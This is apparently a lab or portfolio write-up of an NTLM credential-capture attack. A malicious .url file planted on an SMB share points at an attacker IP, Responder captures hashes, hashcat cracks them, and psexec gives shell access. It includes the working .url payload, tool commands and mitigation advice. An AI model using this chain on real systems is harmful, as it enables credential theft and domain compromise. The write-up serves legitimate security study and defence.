
# URL File Credential Capture Attack

**MITRE ATT&CK:** T1566 (Phishing) / T1204.002 (Malicious File Execution)
**Related Technique:** T1557 (Adversary-in-the-Middle)

---

## 1. Objective

Demonstrate how an attacker with access to a writable SMB share can plant a malicious `.url` file that triggers outbound authentication attempts, resulting in NTLMv2 hash capture via Responder.

This simulates a real-world internal phishing / credential harvesting scenario in enterprise environments.

---

## 2. Attack Prerequisites

* Valid domain credentials (low-privilege is sufficient)
* Access to a writable SMB file share
* Responder running on attacker machine
* LLMNR/NBT-NS not fully disabled
* Outbound authentication allowed

---

## 3. Attack Overview

This attack abuses Windows behavior where:

* A `.url` file referencing a remote resource
* Automatically attempts authentication when the folder is viewed
* Especially if it references an `IconFile` on a remote host

When the victim browses the SMB share, their machine attempts to authenticate to the attacker-controlled IP.

Responder captures the NTLMv2 challenge-response hash.

---

## 4. Step-by-Step Execution

---

### Step 1 — Create Malicious `.url` File

Example payload:

```ini
[InternetShortcut]
URL=file://192.168.177.129/test
IconFile=\\192.168.177.129\share\icon.ico
IconIndex=1
```

Saved as:

```
@company-update.url
```

The `@` ensures the file appears at the top of the directory listing.

📸 Screenshot:

* `screenshots/urlcodefile.png`

---

### Step 2 — Upload File to SMB Share

Using compromised credentials:

* smbclient
* psexec.py
* wmiexec.py
* smbexec.py
* or Metasploit psexec

The file is placed into a shared folder accessible by domain users.

---

### Step 3 — Start Responder

```bash
responder -I wlan0 -v
```

📸 Screenshot:

* `screenshots/responder-url-attack1.png`

---

### Step 4 — Victim Interaction

When the victim browses the SMB folder:

* Windows attempts to retrieve the icon
* Authentication is automatically triggered
* Responder captures NTLMv2 hash

📸 Screenshot:

* `screenshots/responder-url-attack2.png`

Captured hash type:

```
NTLMv2-SSP
```

---

## 5. Hash Cracking

### Identify Hashcat Module

NTLMv2 → Mode 5600

📸 Screenshot:

* `screenshots/hash-module-url-attack.png`

---

### Crack Hash

```bash
hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt -O
```

📸 Screenshot:

* `screenshots/hashcat-url-attack1.png`
* `screenshots/hashcat-url-attack2.png`

Recovered credentials:

```
Username: Administrator
Password: P@$$w0rd!
```

---

## 6. Post-Exploitation

With valid Administrator credentials:

* Remote shell access via:

  * psexec.py
  * Metasploit psexec
* Full domain compromise achieved

📸 Screenshots:

* `screenshots/root-shell-url-attack1.png`
* `screenshots/root-shell-url-attack2.png`

Note: Password required single quotes due to special characters:

```bash
'P@$$w0rd!'
```

---

## 7. Business Impact

If successful in a real enterprise environment:

* Domain Administrator credentials exposed
* Full Active Directory compromise
* Lateral movement across domain
* Potential ransomware deployment
* Data exfiltration
* Long-term persistence

This attack demonstrates how minor user interaction can lead to catastrophic domain compromise.

---

## 8. Why This Works

* NTLM authentication is automatically triggered
* SMB shares are often writable internally
* LLMNR/NBT-NS enabled by default
* Users frequently browse shared folders
* Poor segmentation between workstations and DCs

---

## 9. Defensive Mitigation

* Disable LLMNR and NBT-NS via Group Policy
* Disable NTLM where possible
* Enforce SMB signing
* Remove unnecessary writable shares
* Implement network segmentation
* Monitor for Responder-like traffic
* Use Windows Defender Credential Guard
* Enforce strong password policy

---

## 10. Skills Demonstrated

* SMB abuse
* NTLM credential harvesting
* Responder usage
* Hash identification and cracking
* Remote shell access
* Post-exploitation workflow
* Attack chain thinking
* MITRE ATT&CK mapping

---
